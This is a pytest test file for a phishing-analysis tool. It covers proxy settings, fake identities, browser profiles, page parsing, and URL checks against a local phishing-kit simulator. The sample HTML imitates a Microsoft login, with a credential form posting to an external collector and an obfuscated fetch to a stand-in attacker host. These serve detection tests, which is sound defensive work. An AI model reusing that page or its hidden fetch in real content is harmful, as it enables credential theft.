"""Network checks: settings/proxy, fake identity, browser profiles, page reading,
and full URL checks against the local phishing-kit simulator (no Internet)."""

from __future__ import annotations

import base64
import random
import sys
import threading
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

pytest.importorskip("requests")

from docutracex import appsettings  # noqa: E402
from docutracex.netcheck import http, identity, ipinfo, page  # noqa: E402

VICTIM = "cuentas.pagar@grupoejemplo.example"


@pytest.fixture(autouse=True)
def _config(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("DOCUTRACEX_CONFIG_DIR", str(tmp_path / "config"))


@pytest.fixture(scope="module")
def lab():
    import phish_lab

    srv = phish_lab.serve(0)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_address[1]}"
    srv.shutdown()


# --- settings ---------------------------------------------------------------------------

def test_proxy_settings_round_trip() -> None:
    assert appsettings.proxy_url() is None
    data = appsettings.load()
    data["network"]["proxy"] = appsettings.validate_proxy(
        {"enabled": True, "scheme": "socks5", "host": "127.0.0.1", "port": 9050, "username": "a b", "password": "p@ss"})
    appsettings.save(data)
    assert appsettings.proxy_url() == "socks5h://a%20b:p%40ss@127.0.0.1:9050"
    pub = appsettings.public_network()
    assert pub["proxy_active"] and pub["proxy"]["password_set"] and "password" not in pub["proxy"]


@pytest.mark.parametrize("bad", [{"enabled": True, "host": "", "port": 80}, {"enabled": True, "host": "h", "port": 0},
                                 {"scheme": "ftp", "host": "h", "port": 1}, {"enabled": True, "host": "http://h", "port": 1}])
def test_invalid_proxy_rejected(bad: dict) -> None:
    with pytest.raises(ValueError):
        appsettings.validate_proxy(bad)


# --- identity ---------------------------------------------------------------------------

def test_fake_identity_is_on_a_free_mail_domain() -> None:
    ident = identity.new_identity(random.Random(3))
    assert ident["email"].split("@")[1] in identity.DOMAINS
    assert len(ident["password"]) >= 10


@pytest.mark.parametrize("url,where,encoding", [
    (f"https://x.example/l?email={VICTIM.replace('@', '%40')}&id=1", "query:email", "plain"),
    ("https://x.example/r/" + base64.b64encode(VICTIM.encode()).decode() + "/go", "path", "base64"),
    ("https://x.example/#" + base64.urlsafe_b64encode(VICTIM.encode()).decode().rstrip("="), "fragment", "base64"),
    ("https://x.example/l?user=jdoe", "query:user", "plain"),
])
def test_victim_data_is_replaced(url: str, where: str, encoding: str) -> None:
    ident = identity.new_identity(random.Random(1))
    new, changes = identity.rewrite_url(url, ident)
    assert changes and changes[0]["where"] == where and changes[0]["encoding"] == encoding
    assert "cuentas.pagar" not in new and "jdoe" not in new
    assert ident["email"] in new or ident["username"] in new or \
        base64.urlsafe_b64encode(ident["email"].encode()).decode().rstrip("=")[:12] in new or \
        base64.b64encode(ident["email"].encode()).decode()[:12] in new


def test_clean_url_is_untouched() -> None:
    assert identity.rewrite_url("https://x.example/a?b=1", identity.new_identity()) == ("https://x.example/a?b=1", [])


def test_form_values_fake_everything_but_hidden_fields() -> None:
    ident = identity.new_identity(random.Random(2))
    form = {"inputs": [{"name": "loginfmt", "type": "email"}, {"name": "passwd", "type": "password"},
                       {"name": "flowToken", "type": "hidden", "value": "T0K"}, {"name": "go", "type": "submit"}]}
    assert identity.form_values(form, ident) == {"loginfmt": ident["email"], "passwd": ident["password"], "flowToken": "T0K"}


# --- browser profiles -------------------------------------------------------------------

def test_profiles_look_like_current_browsers() -> None:
    from datetime import date

    d = http.profile("desktop", "https://outlook.office.com/")
    assert list(d)[:3] == ["sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform"]
    assert "Edg/" in d["User-Agent"] and d["Sec-Fetch-Site"] == "cross-site" and d["Accept-Language"].startswith("es-ES")
    assert http._chrome_major(date(2024, 10, 15)) == 130 and http._chrome_major(date(2026, 10, 15)) >= 150
    m = http.profile("iphone")
    assert "iPhone" in m["User-Agent"] and m["Sec-Fetch-Site"] == "none" and "sec-ch-ua" not in m


# --- page reading -----------------------------------------------------------------------

HTML = """<html><head><title>Microsoft 365 - Iniciar sesión</title><meta http-equiv="refresh" content="30; url=/x"></head>
<body onload="steal()"><h1>Microsoft</h1><p>Inicie sesión</p>
<form method="post" action="https://collect.example.net/p.php"><input type="hidden" name="t" value="1">
<input type="email" name="login"><input type="password" name="pw"></form>
<iframe src="https://other.example.org/f"></iframe><a href="javascript:alert(1)">x</a>
<script>fetch(atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYQ=='))</script></body></html>"""


def test_page_findings() -> None:
    info = page.parse(HTML, "https://login.rnicrosoft-online.example/")
    info["_html"] = HTML
    f = page.findings(info, "https://login.rnicrosoft-online.example/", "netcheck:url:x")
    rules = {x["rule"] for x in f}
    assert {"web_credential_form", "web_brand_impersonation", "web_external_iframe"} <= rules
    form = info["forms"][0]
    assert form["has_password"] and form["external"] and form["method"] == "POST"


def test_safe_document_has_no_scripts_handlers_or_network() -> None:
    doc = page.safe_document(HTML, "https://x.example/")
    assert "<script" not in doc.lower() and "onload" not in doc.lower() and "javascript:" not in doc.lower()
    assert "default-src 'none'" in doc and "refresh" not in doc.lower().split("safe preview")[0]


# --- IPs and domains (offline parts) ----------------------------------------------------

@pytest.mark.parametrize("ip,note", [("203.0.113.47", "documentation"), ("10.1.2.3", "private"), ("2001:db8::1", "documentation")])
def test_reserved_ips_are_not_looked_up(ip: str, note: str) -> None:
    data, findings = ipinfo.check(http.session(None), ip)
    assert note in data["note"] and findings == []


@pytest.mark.skipif(not (ipinfo.ipdb_dir() / "dbip-asn-lite.mmdb").is_file(), reason="IP database not provisioned")
def test_offline_ip_database() -> None:
    o = ipinfo.offline("8.8.8.8")
    assert o["asn"] == 15169 and o["country"] == "US"


def test_reserved_domain_is_not_looked_up_but_lookalike_is_flagged() -> None:
    from docutracex.netcheck import domain

    data, findings = domain.check(http.session(None), "login.rnicrosoft-online.example")
    assert "reserved" in data["note"] and "dns" not in data
    assert any(f["rule"] == "lookalike_domain" for f in findings)


# --- full URL check against the simulator ------------------------------------------------

def _case(tmp_path: Path):
    from docutracex import analyze, cases

    with (ROOT / "samples" / "sample.eml").open("rb") as fh:
        m = cases.create_case(fh, "sample.eml", cases_dir=tmp_path / "cases")
    root = tmp_path / "cases" / m["analysis_id"]
    analyze.analyze_case(root)
    return root


def test_url_check_submit_and_download(lab: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from docutracex import netcheck
    from docutracex.storage import CasePaths, read_json

    monkeypatch.setattr(netcheck, "_shot", lambda *a, **k: {"ok": False, "error": "skipped in tests"})
    root = _case(tmp_path)
    paths = CasePaths(root.name, cases_dir=root.parent)
    tok = base64.urlsafe_b64encode(VICTIM.encode()).decode().rstrip("=")
    netcheck.run(root, {"kind": "url", "target": f"{lab}/r/{tok}"})
    c = read_json(paths.subresult("netcheck"))["checks"][0]
    assert c["replacements"][0]["encoding"] == "base64" and "cuentas" not in c["fetched_url"]
    desk, mob = c["views"]["desktop"], c["views"]["iphone"]
    assert [h["status"] for h in desk["hops"]] == [302, 200]  # the bot filter let the "browser" through
    assert desk["page"]["forms"][0]["inputs"][2]["value"] == c["identity"]["email"]  # kit prefilled the fake email
    assert mob["page"]["title"] == "Documento"
    rules = {f["rule"] for f in c["findings"]}
    assert {"web_credential_form", "web_brand_impersonation", "web_cloaking", "js_sandbox_network"} <= rules

    netcheck.run(root, {"kind": "submit", "check_id": c["id"], "form": 0})
    c = read_json(paths.subresult("netcheck"))["checks"][0]
    sub = c["submissions"][0]
    assert sub["sent"]["passwd"] == c["identity"]["password"] and sub["view"]["page"]["title"] == "Comprobar su identidad"
    assert any(f["rule"] == "web_credentials_accepted" for f in c["findings"])

    netcheck.run(root, {"kind": "url", "target": f"{lab}/files/Justificante.docm"})
    d = next(x for x in read_json(paths.subresult("netcheck"))["checks"] if x["target"].endswith(".docm"))
    assert d["downloads"][0]["filename"] == "Justificante.docm"
    assert any(f["rule"] == "dde_link" for f in d["findings"])  # the served .docm was analysed recursively

    # Consolidated findings and IOCs include the checks.
    findings = read_json(paths.subresult("findings"))["findings"]
    assert any(f["source"] == "netcheck" and f["rule"] == "web_credential_form" for f in findings)
    iocs = {i["value"] for i in read_json(paths.subresult("iocs"))["iocs"]}
    assert f"{lab}/owa/auth.php" in iocs


def test_api_settings_and_netcheck_validation(lab: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from fastapi.testclient import TestClient

    from docutracex import netcheck
    from docutracex.app import create_app
    from docutracex.config import settings

    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
    monkeypatch.setattr(netcheck, "_shot", lambda *a, **k: {"ok": False, "error": "skipped in tests"})
    client = TestClient(create_app())
    assert client.get("/api/settings/network").json()["proxy_active"] is False
    r = client.put("/api/settings/network", json={"proxy": {"enabled": True, "scheme": "http", "host": "", "port": 1}})
    assert r.status_code == 400
    assert client.put("/api/settings/network", json={"risk_accepted": True}).json()["risk_accepted"] is True

    cid = client.post("/api/cases", files={"file": ("note.txt", b"see http://127.0.0.1/x")}).json()["analysis_id"]
    for body in ({"kind": "url", "target": "ftp://x"}, {"kind": "domain", "target": "not a domain"},
                 {"kind": "ip", "target": "999.1.1.1"}, {"kind": "submit"}, {"kind": "nope"}):
        assert client.post(f"/api/cases/{cid}/netcheck", json=body).status_code == 400
    assert client.get(f"/api/cases/{cid}/netcheck/asset", params={"path": "original/note.txt"}).status_code == 400

    tid = client.post(f"/api/cases/{cid}/netcheck", json={"kind": "url", "target": f"{lab}/owa/?e="}).json()["task"]["id"]
    for _ in range(600):
        t = next(x for x in client.get("/api/tasks").json()["tasks"] if x["id"] == tid)
        if t["state"] in ("completed", "failed"):
            break
        time.sleep(0.1)
    assert t["state"] == "completed", t
    net = client.get(f"/api/cases/{cid}/netcheck").json()
    assert net["checks"][0]["views"]["desktop"]["status"] == 200
    prev = net["checks"][0]["views"]["desktop"]["preview_path"]
    r = client.get(f"/api/cases/{cid}/netcheck/asset", params={"path": prev})
    assert r.status_code == 200 and "sandbox" in r.headers["content-security-policy"] and "<script" not in r.text


def test_loaded_settings_never_alias_the_defaults() -> None:
    data = appsettings.load()
    data["network"]["proxy"]["host"] = "mutated"
    assert appsettings.DEFAULTS["network"]["proxy"]["host"] == ""


def test_check_runs_as_a_subprocess_like_on_the_portable(tmp_path: Path) -> None:
    """The task queue runs `python -m docutracex.netcheck <case> <json>` on the
    portable interpreter: the package must be executable with -m."""
    import json
    import os
    import subprocess

    from docutracex import cases
    from docutracex.storage import CasePaths, read_json

    with (ROOT / "samples" / "sample.rtf").open("rb") as fh:
        m = cases.create_case(fh, "x.rtf", cases_dir=tmp_path / "cases")
    root = tmp_path / "cases" / m["analysis_id"]
    env = dict(os.environ, PYTHONPATH=str(ROOT), DOCUTRACEX_CONFIG_DIR=str(tmp_path / "config"))
    proc = subprocess.run([sys.executable, "-m", "docutracex.netcheck", str(root),
                           json.dumps({"kind": "domain", "target": "login.rnicrosoft-online.example"})],
                          capture_output=True, text=True, timeout=120, env=env, cwd=str(tmp_path))
    assert proc.returncode == 0, proc.stderr[-800:]
    net = read_json(CasePaths(root.name, cases_dir=root.parent).subresult("netcheck"))
    assert net["checks"][0]["target"] == "login.rnicrosoft-online.example"
